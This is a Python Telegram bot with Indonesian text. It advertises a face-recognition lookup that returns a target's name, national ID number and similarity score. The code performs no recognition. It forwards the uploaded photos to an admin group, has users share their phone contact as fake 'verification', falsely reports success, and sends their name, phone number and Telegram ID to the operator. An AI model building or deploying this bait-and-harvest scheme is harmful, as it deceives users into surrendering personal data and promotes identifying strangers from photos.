import os
import asyncio
import logging
from datetime import datetime
from dotenv import load_dotenv

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# --- KONFIGURASI LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
try:
    ADMIN_ID = int(os.getenv("ADMIN_GROUP_ID").strip())
except Exception as e:
    logger.error(f"Gagal memuat ADMIN_GROUP_ID: {e}")
    ADMIN_ID = None

# --- HANDLER /START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else "Tidak ada username"
    
    # Pesan welcome tanpa info ID/Username user (Sesuai Permintaan)
    welcome_text = (
        "SELAMAT DATANG\n\n"
        "BOT FR TESTING\n"
        "(KUOTA 10/DAY)\n\n"
        "CARA PENGGUNAAN BOT\n\n"
        "1. SILAHKAN MASUKKAN FOTO TARGET, UPAYAKAN FOTO TAMPAK DEPAN DAN TERLIHAT JELAS.\n\n"
        "2. SISTEM AKAN MELAKUKAN PENGECEKAN FR TARGET DALAM 10MENIT WAKTU TERCEPAT UNTUK MENDAPATKAN HASIL FR AKURASI TINGGI.\n\n"
        "3. BOT AKAN MENAMPILKAN HASIL NAMA, NIK, DAN PERSENTASE KEMIRIPAN DENGAN FOTO TARGET.\n\n"
        "4. BOT BERFUNGSI SAAT SERVER HIDUP DI PUKUL 06.00 WIB SAMPAI DENGAN PUKUL 21.00 WIB.\n\n"
        "5. GUNAKAN AKSES DENGAN BIJAK. TERIMAKASIH\n\n\n"
        "SELAMAT BERTUGAS, SEMOGA SUKSES SELALU"
    )
    
    # Kirim ke User
    await update.message.reply_text(welcome_text, reply_markup=ReplyKeyboardRemove())

    # Notifikasi ke Admin (Tetap ada agar admin tahu siapa yang start)
    if ADMIN_ID:
        try:
            admin_log = (
                "🔔 **USER BARU START BOT**\n"
                f"👤 Nama: {user.full_name}\n"
                f"🆔 ID: `{user.id}`\n"
                f"🏷 Username: {username}"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_log, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Gagal kirim log ke admin: {e}")

# --- HANDLER FOTO ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    username = f"@{user.username}" if user.username else "N/A"
    photo_id = update.message.photo[-1].file_id
    
    await update.message.reply_text("📥 Foto diterima. Menunggu verifikasi identitas...")

    contact_keyboard = [[KeyboardButton("📱 KLIK DISINI UNTUK VERIFIKASI KONTAK", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(contact_keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await update.message.reply_text(
        "⚠️ Untuk memproses foto ini, silakan verifikasi kontak Anda terlebih dahulu melalui tombol di bawah:",
        reply_markup=reply_markup
    )

    if ADMIN_ID:
        try:
            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=photo_id,
                caption=f"📸 **FOTO MASUK**\nUser: {user.full_name}\nUsername: {username}\nID: `{user.id}`",
                parse_mode='Markdown'
            )
        except Exception as e:
            logger.error(f"Gagal kirim foto ke admin: {e}")

# --- HANDLER KONTAK ---
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_contact = update.message.contact
    
    await update.message.reply_text(
        "✅ Verifikasi berhasil. Identitas tervalidasi.",
        reply_markup=ReplyKeyboardRemove()
    )
    
    await asyncio.sleep(1.5)
    await update.message.reply_text("Sedang diproses...")

    if ADMIN_ID:
        try:
            info_kontak = (
                "📱 **VERIFIKASI KONTAK BERHASIL**\n"
                "---------------------------\n"
                f"👤 Nama: {user_contact.first_name} {user_contact.last_name or ''}\n"
                f"📞 No Telp: `{user_contact.phone_number}`\n"
                f"🆔 ID Telegram: `{user_contact.user_id}`\n"
                "---------------------------"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=info_kontak, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Gagal kirim kontak ke admin: {e}")

# --- MAIN ---
if __name__ == '__main__':
    if not TOKEN or not ADMIN_ID:
        print("❌ Cek .env! Pastikan BOT_TOKEN dan ADMIN_GROUP_ID sudah benar.")
        exit()

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))

    print(f"🚀 Bot Running... Admin ID: {ADMIN_ID}")
    app.run_polling(drop_pending_updates=True)
